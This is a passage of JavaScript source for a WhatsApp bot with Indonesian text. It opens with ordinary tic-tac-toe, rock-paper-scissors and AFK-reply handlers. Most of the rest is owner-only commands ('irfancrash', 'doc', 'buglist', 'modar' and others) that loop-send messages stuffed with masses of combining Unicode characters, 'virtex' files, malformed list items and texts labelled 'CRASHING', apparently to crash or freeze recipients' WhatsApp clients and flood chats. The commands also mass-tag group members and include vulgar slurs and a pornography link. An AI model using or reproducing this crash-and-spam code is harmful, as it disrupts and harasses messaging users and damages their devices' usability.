	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`

Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
	    
        switch(command) {
	    case 'yuhu': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} My Name 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break

  case 'datuisme':{

if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let pek = { 
        
key: { 
            
fromMe: false, 
            
participant: `0@s.whatsapp.net`, 
            
...({ remoteJid: "" }) 
        
}, 
        
message: { 
            
"imageMessage": { 
                
"mimetype": "image/jpeg", 
                
"caption": `kontol`, 
                
"jpegThumbnail": thumb
            
} 
        
} 
    
}

hisoka.sendText(m.chat, `🇹 🇭 🇪 🇫 🇴 🇺 🇷`, text, {quoted: pek})
}
}
break
 case 'irfancrash':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = '``🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥``',
hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'doc':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
y1 = fs.readFileSync('./virtex/iphone.mp3')
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥 ${doc}.mp3`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥 ${jobot}.txt`, quoted: m})
hisoka.sendMessage(m.chat, {document: y1, fileName: `🔥 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ 🔥 ${ngazap}.js`, quoted: m})
}
}
break
case 'atebakat':{
              if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]

const buttonMessage = {
    text: `${philips}`,
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
hisoka.sendMessage(m.chat, buttonMessage)
}
}
               break
case 'buttonfour':{
              if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
a = await hisoka.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
              const buttons = [
  {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonfour}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonfour}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: buttonfour}, type: 1}
]

const buttonMessage = {
    text: `${four}`,
    footerText: 'Pe',
    buttons: buttons,
    headerType: 1
}
hisoka.sendMessage(m.chat, buttonMessage,  { quoted: a })
}
}
               break
case 'buglist':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolputralist = [
                {
                title: `༒✪͜͡★➤⃨⃞⃟𝙸𝚃𝚉 𝙼𝙴 𝙹𝙾➤⃨⃞⃟★፝͜͡✪༒ ${ngazap} ${jobot}`,
                rows: [
                {title: jobot, rowId: `asu'+$+$+$+2+#`, description: `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰`},
                {title: ngazap, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
                ]
                }
                ]
                hisoka.sendListMsg(m.chat, `༒✪͜͡★➤⃨⃞⃟𝙸𝚃𝚉 𝙼𝙴 𝙹𝙾➤⃨⃞⃟★፝͜͡✪༒`, hisoka.user.name, `Hay Ngentod`, `༒✪͜͡★➤⃨⃞⃟𝙸𝚃𝚉 𝙼𝙴 𝙹𝙾➤⃨⃞⃟★፝͜͡✪༒`, kontolputralist, m)
                }
                }
break
case 'tagwae': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group 
                if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
                 a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                let teks = jobot
                for (let mem of participants) {
                teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ @${mem.id.split('@')[0]}\n`
                }
                hisoka.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: a })
                }
                }
                break

case 'modar' : {
                    if(!m.key.fromMe) return
if (!isCreator) return
                    a = await hisoka.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
